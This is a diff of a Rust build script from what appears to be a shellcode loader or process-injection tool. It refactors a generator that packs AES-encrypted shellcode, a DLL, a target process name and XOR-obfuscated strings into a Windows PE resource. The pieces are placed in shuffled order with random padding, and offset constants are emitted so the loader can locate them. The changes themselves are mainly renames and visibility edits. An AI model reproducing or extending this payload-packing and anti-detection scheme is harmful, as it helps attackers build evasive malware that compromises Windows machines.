@@ -1,15 +1,14 @@
 use rand;
 use rand::seq::SliceRandom;
 use rand::Rng;
-use std::fs;
-use std::ops::Range;
-
-include!("build_config.rs");
-include!("build_util.rs");
+use std::{env, fs};
+use winresource::WindowsResource;
+use crate::build_src::build_config::{DLL_PATH, PAD_RANGE, RESOURCE_ID, RESOURCE_NAME, SHELLCODE_PATH, TARGET_PROCESS, STRINGS};
+use crate::build_src::build_util::{aes_encrypt_bytes, generate_random_bytes, get_iv_len, get_key_len, xor_encrypt_bytes};
 
 type BuildFn = fn(&mut ResourceGenerator, &mut Vec<u8>);
 
-struct XORString {
+struct Strings {
     string_name: &'static str,
     encrypted_bytes: Vec<u8>,
     offset: usize,
@@ -17,7 +16,7 @@ struct XORString {
     key_offset: usize,
 }
 
-pub struct ResourceGenerator {
+pub(crate) struct ResourceGenerator {
     out_dir: String,
     aes_key_bytes: Vec<u8>,
     aes_key_offset: usize,
@@ -29,11 +28,11 @@ pub struct ResourceGenerator {
     shellcode_offset: usize,
     dll_bytes: Vec<u8>,
     dll_offset: usize,
-    xor_strings: Vec<XORString>,
+    strings: Vec<Strings>,
 }
 
 impl ResourceGenerator {
-    fn new(out_dir: String) -> Self {
+    pub(crate) fn new(out_dir: String) -> Self {
         let aes_iv = generate_random_bytes(get_iv_len());
         let aes_key = generate_random_bytes(get_key_len());
 
@@ -67,13 +66,13 @@ impl ResourceGenerator {
             vec![]
         };
 
-        let xor_strings = XOR_STRINGS
+        let strings = STRINGS
             .into_iter()
-            .map(|string_name| {
-                let key = generate_random_bytes(string_name.len());
-                XORString {
-                    string_name,
-                    encrypted_bytes: xor_encrypt_bytes(string_name.to_lowercase().as_bytes(), &key[..]),
+            .map(|string| {
+                let key = generate_random_bytes(string.len());
+                Strings {
+                    string_name: string,
+                    encrypted_bytes: xor_encrypt_bytes(string.to_lowercase().as_bytes(), &key[..]),
                     offset: usize::MAX,
                     key_bytes: key,
                     key_offset: usize::MAX,
@@ -93,11 +92,11 @@ impl ResourceGenerator {
             shellcode_offset: usize::MAX,
             dll_bytes: dll,
             dll_offset: usize::MAX,
-            xor_strings,
+            strings,
         }
     }
 
-    fn build_resource_file(&mut self) {
+    pub(crate) fn build_resource_file(&mut self) {
         // Put these functions into a vector we can then pop functions out of, to randomize position of resources.
         let mut functions: Vec<BuildFn> = vec![
             ResourceGenerator::add_aes_key_to_payload,
@@ -108,12 +107,12 @@ impl ResourceGenerator {
         ];
 
         functions.resize(
-            functions.len() + self.xor_strings.len(),
-            ResourceGenerator::add_xor_string_to_payload,
+            functions.len() + self.strings.len(),
+            ResourceGenerator::add_string_to_payload,
         );
 
         // Randomize the position of strings and order resources are added to the final resource.
-        self.xor_strings.shuffle(&mut rand::thread_rng());
+        self.strings.shuffle(&mut rand::thread_rng());
         functions.shuffle(&mut rand::thread_rng());
 
         // Make a new Vec<u8> and start adding to it.
@@ -122,7 +121,7 @@ impl ResourceGenerator {
             function(self, &mut resource)
         }
 
-        let end_pad = generate_random_bytes(rand::thread_rng().gen_range(RANGE));
+        let end_pad = generate_random_bytes(rand::thread_rng().gen_range(PAD_RANGE));
         resource.extend(end_pad);
 
         fs::write(format!("{}/{}", self.out_dir, RESOURCE_NAME), resource)
@@ -130,34 +129,34 @@ impl ResourceGenerator {
     }
 
     fn add_target_to_payload(&mut self, payload: &mut Vec<u8>) {
-        let bytes = generate_random_bytes(rand::thread_rng().gen_range(RANGE));
+        let bytes = generate_random_bytes(rand::thread_rng().gen_range(PAD_RANGE));
         payload.extend(bytes);
 
         self.target_offset = payload.len();
         payload.extend(&self.target_bytes);
     }
 
-    fn add_xor_string_to_payload(&mut self, payload: &mut Vec<u8>) {
-        let bytes = generate_random_bytes(rand::thread_rng().gen_range(RANGE));
+    fn add_string_to_payload(&mut self, payload: &mut Vec<u8>) {
+        let bytes = generate_random_bytes(rand::thread_rng().gen_range(PAD_RANGE));
         payload.extend(bytes);
 
-        let mut xor_string = self.xor_strings.pop().expect("No string info to pop!");
-        xor_string.offset = payload.len();
-        payload.extend(&xor_string.encrypted_bytes);
+        let mut string = self.strings.pop().expect("No string info to pop!");
+        string.offset = payload.len();
+        payload.extend(&string.encrypted_bytes);
 
         //put the key in after, simplest solution.
-        let bytes = generate_random_bytes(rand::thread_rng().gen_range(RANGE));
+        let bytes = generate_random_bytes(rand::thread_rng().gen_range(PAD_RANGE));
         payload.extend(bytes);
 
-        xor_string.key_offset = payload.len();
-        payload.extend(&xor_string.key_bytes);
+        string.key_offset = payload.len();
+        payload.extend(&string.key_bytes);
 
         // We put the xor_strings back into the vector so we can write down the offsets, later.
-        self.xor_strings.insert(0, xor_string);
+        self.strings.insert(0, string);
     }
 
     fn add_aes_key_to_payload(&mut self, payload: &mut Vec<u8>) {
-        let bytes = generate_random_bytes(rand::thread_rng().gen_range(RANGE));
+        let bytes = generate_random_bytes(rand::thread_rng().gen_range(PAD_RANGE));
         payload.extend(bytes);
 
         self.aes_key_offset = payload.len();
@@ -165,7 +164,7 @@ impl ResourceGenerator {
     }
 
     fn add_aes_iv_to_payload(&mut self, payload: &mut Vec<u8>) {
-        let bytes = generate_random_bytes(rand::thread_rng().gen_range(RANGE));
+        let bytes = generate_random_bytes(rand::thread_rng().gen_range(PAD_RANGE));
         payload.extend(bytes);
 
         self.aes_iv_offset = payload.len();
@@ -173,7 +172,7 @@ impl ResourceGenerator {
     }
 
     fn add_shellcode_to_payload(&mut self, payload: &mut Vec<u8>) {
-        let bytes = generate_random_bytes(rand::thread_rng().gen_range(RANGE));
+        let bytes = generate_random_bytes(rand::thread_rng().gen_range(PAD_RANGE));
         payload.extend(bytes);
 
         self.shellcode_offset = payload.len();
@@ -181,14 +180,14 @@ impl ResourceGenerator {
     }
 
     fn add_dll_to_payload(&mut self, payload: &mut Vec<u8>) {
-        let bytes = generate_random_bytes(rand::thread_rng().gen_range(RANGE));
+        let bytes = generate_random_bytes(rand::thread_rng().gen_range(PAD_RANGE));
         payload.extend(bytes);
 
         self.dll_offset = payload.len();
         payload.extend(&self.dll_bytes);
     }
 
-    fn build_consts_file(&self) {
+    pub(crate) fn build_consts_file(&self) {
         let mut consts = vec!["#![allow(unused)]".to_string()];
 
         consts.push(format!(
@@ -249,7 +248,7 @@ impl ResourceGenerator {
             self.dll_bytes.len()
         ));
 
-        self.xor_strings.iter().for_each(|string| {
+        self.strings.iter().for_each(|string| {
             consts.push(format!(
                 "pub const {}: usize = {:#X};",
                 string.string_name.to_uppercase().replace(".", "_") + "_POS",
@@ -270,7 +269,7 @@ impl ResourceGenerator {
         fs::write("src/consts.rs", consts.join("\n")).expect("Could not write consts file.");
     }
 
-    fn build_pe_embed_files(&self) {
+    pub(crate) fn build_pe_embed_files(&self) {
         fs::write(
             format!("{}/resources.h", self.out_dir),
             format!("#define PAYLOAD_ID {}\n", RESOURCE_ID),
@@ -287,7 +286,7 @@ impl ResourceGenerator {
         .expect("Could not write resources.rc file.");
     }
 
-    fn set_pe_resource_file(&self) {
+    pub(crate) fn set_pe_resource_file(&self) {
         if env::var("CARGO_CFG_TARGET_OS").unwrap() == "windows" {
             WindowsResource::new()
                 .set_resource_file(&format!("{}/resources.rc", self.out_dir))
